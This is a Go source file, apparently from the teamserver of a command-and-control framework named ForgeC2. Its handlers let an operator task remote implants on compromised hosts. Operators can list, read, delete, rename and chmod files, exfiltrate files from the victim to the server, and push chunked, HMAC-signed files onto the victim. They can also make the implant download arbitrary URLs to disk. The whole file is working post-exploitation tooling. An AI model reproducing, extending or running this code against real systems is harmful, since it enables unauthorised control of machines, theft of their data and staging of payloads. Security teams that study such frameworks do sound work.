package server

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleFileBrowserPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Implant
	query := s.tenantScope(s.db.Model(&db.Implant{}), c)
	if err := query.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":     "ForgeC2 - File Browser",
		"Agent":     agent,
		"Path":      c.Query("path"),
		"ActiveNav": "agents",
		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

func (s *Server) handleListDir(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	path := c.PostForm("path")
	if path == "" {
		path = "C:\\"
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "ls", Command: path, Path: path})
	if task == nil {
		return
	}

	slog.Info("Directory list requested", "agent_id", id, "path", path)
	respond(c, gin.H{
		"task_id": task.ID,
		"queued":  true,
		"kind":    "ls_task",
	})
}

func (s *Server) handleFileDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "delete", Command: filePath, Path: filePath})
	if task == nil {
		return
	}

	slog.Info("File delete requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_delete", filePath)
}

func (s *Server) handleFileMkdir(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	dirPath := c.PostForm("path")
	if dirPath == "" {
		respondError(c, http.StatusBadRequest, "directory path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "mkdir", Command: dirPath, Path: dirPath})
	if task == nil {
		return
	}

	slog.Info("Directory create requested", "agent_id", id, "path", dirPath)
	s.dispatchTask(c, task, "file_mkdir", dirPath)
}

func (s *Server) handleFileRename(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	srcPath := c.PostForm("path")
	dstPath := c.PostForm("dest")
	if dstPath == "" {
		dstPath = c.PostForm("destination")
	}
	if srcPath == "" || dstPath == "" {
		respondError(c, http.StatusBadRequest, "source and destination paths required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "rename", Command: srcPath, Path: srcPath, Data: dstPath})
	if task == nil {
		return
	}

	slog.Info("File rename requested", "agent_id", id, "src", srcPath, "dst", dstPath)
	s.dispatchTask(c, task, "file_rename", srcPath+" -> "+dstPath)
}

func (s *Server) handleFileChmod(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	mode := c.PostForm("mode")
	if mode == "" {
		mode = c.PostForm("data")
	}
	if filePath == "" || mode == "" {
		respondError(c, http.StatusBadRequest, "path and octal mode are required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "chmod", Command: filePath, Path: filePath, Data: mode})
	if task == nil {
		return
	}

	slog.Info("File chmod requested", "agent_id", id, "path", filePath, "mode", mode)
	s.dispatchTask(c, task, "file_chmod", filePath+" "+mode)
}

func (s *Server) handleFileRead(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "read", Command: filePath, Path: filePath})
	if task == nil {
		return
	}

	slog.Info("File read requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_read", filePath)
}

// handleFileUploadFromAgent queues an implant→server exfil (task type "upload"
// with no payload bytes). Prefer POST /agents/:id/files/pull. The legacy
// POST /files/upload path stays for old consoles.
func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	// A multipart file here means the operator hit the exfil route by mistake.
	// Pushing a teamserver file onto the implant is POST /agents/:id/upload.
	if strings.Contains(c.GetHeader("Content-Type"), "multipart/form-data") {
		if _, err := c.FormFile("file"); err == nil {
			respondError(c, http.StatusBadRequest, "this endpoint queues an implant-to-server exfil; use POST /agents/:id/upload to push a file onto the implant")
			return
		}
	}
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	offset, size := parseTransferRange(c)
	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: filePath, Path: filePath, Offset: offset, Size: size})
	if task == nil {
		return
	}

	slog.Info("File exfil requested", "agent_id", id, "path", filePath, "offset", offset, "size", size)
	s.dispatchTask(c, task, "file_upload_exfil", filePath)
}

func parseTransferRange(c *gin.Context) (offset, size int64) {
	if v := c.PostForm("offset"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n >= 0 {
			offset = n
		}
	}
	if v := c.PostForm("size"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
			if n > MaxTransferChunkSize {
				n = MaxTransferChunkSize
			}
			size = n
		}
	}
	return offset, size
}

// pushChunk is one offset-addressed slice of a file push. The first chunk
// truncates at offset 0 on the agent; the rest seek to their offset.
type pushChunk struct {
	data   string
	offset int64
}

// splitPushChunks slices raw into base64 chunks bounded by
// MaxTransferChunkSize so no single task row carries a multi-MB blob.
// Files at or under the cap yield exactly one chunk at offset 0.
func splitPushChunks(raw []byte) []pushChunk {
	if len(raw) <= MaxTransferChunkSize {
		return []pushChunk{{data: base64.StdEncoding.EncodeToString(raw)}}
	}
	var chunks []pushChunk
	for off := 0; off < len(raw); off += MaxTransferChunkSize {
		end := off + MaxTransferChunkSize
		if end > len(raw) {
			end = len(raw)
		}
		chunks = append(chunks, pushChunk{
			data:   base64.StdEncoding.EncodeToString(raw[off:end]),
			offset: int64(off),
		})
	}
	return chunks
}

// handleDownload queues an implant URL fetch onto its own disk (task type
// "download", command = URL). This is not operator exfil.
func (s *Server) handleDownload(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	fileURL := c.PostForm("url")
	targetPath := c.PostForm("path")

	if fileURL == "" || targetPath == "" {
		respondError(c, http.StatusBadRequest, "url and path required")
		return
	}

	// Same SSRF gate as handleDownloadURL: the implant fetches this URL.
	if err := validateExternalURL(fileURL); err != nil {
		respondError(c, http.StatusBadRequest, "blocked URL: "+sanitizeError(err, "download URL"))
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "download", Command: fileURL, Shell: targetPath, Path: targetPath})
	if task == nil {
		return
	}

	slog.Info("File download requested", "agent_id", id, "url", fileURL, "path", targetPath)
	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
}

// handleUploadFile pushes a teamserver file onto the implant (task type
// "upload" with payload bytes). Prefer POST /agents/:id/files/push. The
// legacy POST /upload path stays for old consoles.
func (s *Server) handleUploadFile(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	targetPath := c.PostForm("target_path")
	if targetPath == "" {
		targetPath = c.PostForm("path")
	}
	if targetPath == "" {
		respondError(c, http.StatusBadRequest, "target path required")
		return
	}

	file, err := c.FormFile("file")
	if err != nil {
		respondError(c, http.StatusBadRequest, "file required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	if file.Size > MaxUploadSize {
		respondError(c, http.StatusBadRequest, "file too large (max 50MB)")
		return
	}

	fileData, err := readFileToBase64(file)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read file")
		return
	}
	rawFile, err := base64.StdEncoding.DecodeString(fileData)
	if err != nil {
		respondError(c, http.StatusBadRequest, "failed to decode file data")
		return
	}

	// Auto-chunking: files larger than MaxTransferChunkSize are split into
	// sequential offset-addressed upload tasks (first chunk truncates at
	// offset 0, the rest seek), each HMAC-chained and bounded to 4MiB so no
	// single task row carries a multi-MB base64 blob. Small files keep the
	// legacy single-task path. No agent change needed: uploadFileChunk
	// already honors offset + per-chunk MAC.
	chunks := splitPushChunks(rawFile)
	if len(chunks) == 1 {
		// chunked support — validate offset to prevent negative seek corruption and sparse file bomb
		if offsetStr := c.PostForm("offset"); offsetStr != "" {
			off, err := strconv.ParseInt(offsetStr, 10, 64)
			if err != nil || off < 0 || off > 8<<30 {
				respondError(c, http.StatusBadRequest, "invalid offset")
				return
			}
			chunks[0].offset = off
		}
	}

	// The chain link must carry across the WHOLE transfer: keying it by each chunk's own
	// task id restarted every chunk from the zero seed, so a relay could reorder or
	// replace chunk 2 onwards and each still verified on its own.
	chainKey := s.fileChainKey(id)
	var chainPrev []byte
	if chainKey == nil {
		respondError(c, http.StatusInternalServerError, "cannot derive the upload integrity key")
		return
	}

	var taskIDs []uint
	for _, ch := range chunks {
		task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: targetPath, Path: targetPath, Data: ch.data, Offset: ch.offset})
		if task == nil {
			return
		}
		// HMAC integrity chain: the agent refuses to write the chunk unless the
		// recomputed MAC matches, so tampering with a pushed chunk is detected
		// before it touches disk. (Each chunk is bounded by MaxTransferChunkSize.)
		rawChunk, err := base64.StdEncoding.DecodeString(ch.data)
		if err != nil {
			respondError(c, http.StatusBadRequest, "failed to decode file data")
			return
		}
		if prevMAC, mac, err := chainForPushSequence(chainKey, chainPrev, rawChunk); err != nil {
			slog.Error("Failed to build upload integrity chain", "agent_id", id, "task_id", task.ID, "error", err)
			respondError(c, http.StatusInternalServerError, "failed to sign upload chunk")
			return
		} else {
			task.PrevMAC = prevMAC
			task.MAC = mac
			chainPrev, _ = hex.DecodeString(mac)
		}
		if err := s.db.Save(task).Error; err != nil {
			respondError(c, http.StatusInternalServerError, "failed to save upload offset")
			return
		}
		taskIDs = append(taskIDs, task.ID)
		s.broadcastTaskUpdate(id, *task)
	}
	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)

	slog.Info("File push requested", "agent_id", id, "path", targetPath, "chunks", len(taskIDs))
	respond(c, gin.H{"task_id": taskIDs[0], "task_ids": taskIDs, "chunks": len(taskIDs), "kind": "file_push", "queued": true})
}

// handleFileExfilGet serves a file the implant already exfiltrated into data/uploads/:id/.
func (s *Server) handleFileExfilGet(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filename := filepath.Base(c.Param("filename"))
	if filename == "" || filename == "." || filename == ".." {
		respondError(c, http.StatusBadRequest, "filename required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	dataDir := s.rawDataDir()
	if dataDir == "" {
		dataDir = "data"
	}
	base := filepath.Join(dataDir, "uploads", id)
	requested := safeJoin(base, filename)
	if requested == "" {
		respondError(c, http.StatusBadRequest, "invalid filename")
		return
	}
	serveFileSafe(c, requested, base, filename)
}

func readFileToBase64(file *multipart.FileHeader) (string, error) {
	f, err := file.Open()
	if err != nil {
		return "", err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(data), nil
}
